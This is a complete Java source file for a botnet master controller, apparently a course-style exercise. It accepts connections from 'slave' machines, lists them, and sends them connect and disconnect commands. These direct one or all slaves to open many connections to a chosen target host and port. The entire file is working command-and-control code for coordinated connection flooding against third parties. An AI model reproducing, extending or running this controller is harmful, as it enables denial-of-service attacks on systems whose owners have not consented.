import java.io.*;
import java.util.*;
import java.net.*;
import java.text.*;


class ServerThread implements Runnable
{
    static int port;
    SimpleDateFormat sdf = new SimpleDateFormat("YYYY-M-dd");
    public void run()
    {
        try {
            ServerSocket server = new ServerSocket(port);
            Socket connection = null;
            System.out.println("\n");
            System.out.println("server listening on port " + port);

            while(true) {
                try {
                    SlaveObj s_object = new SlaveObj();
                    connection = server.accept();
                    s_object.slave_socket = connection;
                    s_object.reg_date = sdf.format(new Date());
                    s_object.inactive = false;
                    MasterBot.slavelist.add(s_object);
                }
                catch (IOException ex) {
                    System.out.println("Error in accepting the slave connection");
                }
            }//end while
        }//end try
        catch (IOException ex) {
            System.err.println(ex);
        }//end catch
    }
}

class SlaveObj {
    Socket slave_socket;
    String reg_date;
    String slave_ip;
    String slave_hostname;
    int slave_port;
    Boolean inactive;
}

public class MasterBot {

    static ArrayList<SlaveObj> slavelist = new ArrayList<SlaveObj>();
    static Integer port;
    public static void main(String[] args) {

        if (args.length == 0) {
            System.out.println("Unknown format.");
            System.out.println("Format: java master -p <port number>" );
            return;
        }
        if (args[0].equals("-p")) {
            try{
                port = Integer.parseInt(args[1]);
                if (port < 0 || port >= 65565) {
                    System.out.println("Specify a valid port entry [65565 < port > 1024]");
                    return;
                } else if (port <= 1024) {
                    System.out.println(" [0 - 1024] port numbers reserved as system ports");
                    System.out.println("Specify a valid port entry [65565 < port > 1024]");
                    return;
                }
                System.out.println("Using user specified port: " + port);
            }
            catch (NumberFormatException ex) {
                System.out.println("Port should be numeric type.");
                System.out.println("Format: java master -p <port number>" );    
                return;
            }
        }
        else {
            System.out.println("Unknown format.");
            System.out.println("Format: java master -p <port number>" );
            return;
        }

        ServerThread server = new ServerThread();
        server.port = port;
        Thread      Sthread = new Thread(server);
        Sthread.start();

        String next_input,wordArray[],command_buf= null;
        InetAddress host;
        String hostIP,targetSlave, hostName, num_connections;
        int slavePort, wordCount;
        Boolean flag_found;

        Scanner user_input = new Scanner(System.in);
        String[] validCommands = {"list", "connect", "disconnect", "exit", "help"};

        for(int k=0;k<800000;k++);

        while(true) {
            System.out.print(" > ");
            next_input = user_input.nextLine();
            if (next_input.length() == 0) {
                continue;
            }

            wordArray = next_input.split("\\s+");
            wordCount = wordArray.length;
            String command = wordArray[0].toLowerCase();
            Boolean valid = false;
            //Check if its a valid command
            for (int i=0; i<validCommands.length; i++) {
                if (command.equals(validCommands[i])) {
                    valid = true;
                    break;
                }
            }

            System.out.println("\n");
            if (!valid || command.equals("help")) {
                System.out.println("Usage: ");
                System.out.println(">list");
                System.out.println(">connect <SlaveHostName>|<SlaveIP>|all <TargetHostName>|<TargetIP> <TargetPort> [NumberOfConnections]      ");
                System.out.println(">disconnect  <SlaveHostName>|<SlaveIP>|all <TargetHostName>|<TargetIP> [TargetPort:all]");
                System.out.println(">help");
                System.out.println(">exit");
                continue;
            }

            if (command.equals("exit")) {
                System.exit(0);
            }


            //Handle list command
            if (command.equals("list")) {
                if(slavelist.size() == 0) {
                    System.out.println("No slaves registered currently. ");
                    continue;
                }
                System.out.println(" SlaveHostName         IPaddress      Sourceport      Registrationdate ");
                System.out.println(" ______________________________________________________________________");

                for(int i=0; i < slavelist.size(); i++){
                    if(slavelist.size() == 0) {
                        System.out.println("No slaves registered currently. ");
                        continue;
                    }

                    SlaveObj so = slavelist.get(i);
                    if (so.inactive)
                        continue;

                    try {
                        for (int j=0; j<2; j++) {
                            //Try to send a keep-alive message to make sure the client is still active
                            OutputStreamWriter out = new OutputStreamWriter(so.slave_socket.getOutputStream());   
                            out.write("Hello\n");
                            out.flush();
                        }
                    }
                    catch(IOException ex) {
                        try {
                            so.slave_socket.close();
                        } catch(Exception ex2) {}

                        so.inactive=true;
                        //slavelist.remove(so);
                        continue;
                    }

                    host = so.slave_socket.getInetAddress();
                    hostIP = host.getHostAddress() ;
                    hostName = host.getHostName();
                    slavePort = so.slave_socket.getPort();
                    System.out.println(" "+hostName + "      " + hostIP + "     " + slavePort + "          " + so.reg_date);
                }
                //Done with processing this command. Go back and wait for next command
                continue;
            }

            //Handle connect and disconnect commands
            if(command.equals("connect")) {
                if (wordCount == 4 || wordCount == 5) {
                    if (wordCount == 4) num_connections = "1";
                    else num_connections = wordArray[4];

                    command_buf = wordArray[0]+" "+wordArray[2]+" "+wordArray[3]+" "+num_connections;
                } else {
                    System.out.println("Usage: " + command + " <SlaveHostName>|<SlaveIP>|all "+
                            "<TargetHostName>|<TargetIP>  <TargetPort> [<NumberOfConnections>]");
                    continue;
                }
            } else if (command.equals("disconnect")) {

                if(wordCount == 3 || wordCount == 4) {
                    String dis_port = "all";
                    if (wordCount == 4) {
                        dis_port = wordArray[3];
                    }
                    command_buf = wordArray[0]+" "+wordArray[2]+" "+dis_port;
                }
                else {
                    System.out.println("Usage: " + command + " <SlaveHostName>|<SlaveIP>|all "+
                            "<TargetHostName>|<TargetIP>  <TargetPort>|all");
                    continue;
                }
            }

            targetSlave = wordArray[1];
            flag_found = false;

            for(int i=0; i < slavelist.size(); i++){
                SlaveObj so = slavelist.get(i);
                host = so.slave_socket.getInetAddress();
                hostIP = host.getHostAddress() ;
                hostName = host.getHostName();

                if (targetSlave.equals("all") || (hostIP.equals(targetSlave) || hostName.equals(targetSlave))) {
                    //Send the command to this slave
                    flag_found = true;
                    try {
                        OutputStreamWriter out = new OutputStreamWriter(so.slave_socket.getOutputStream());   
                        out.write(command_buf + "\n");
                        out.flush();
                    }
                    catch(IOException ex) {
                        System.out.println("Output stream IO exception occured.");
                    }
                }
            }

            if (!flag_found) {
                System.out.println("Slave with IP "+wordArray[1]+ " not registered currently.");
                continue;
            }

        } //end while
    } /*End of main*/
}
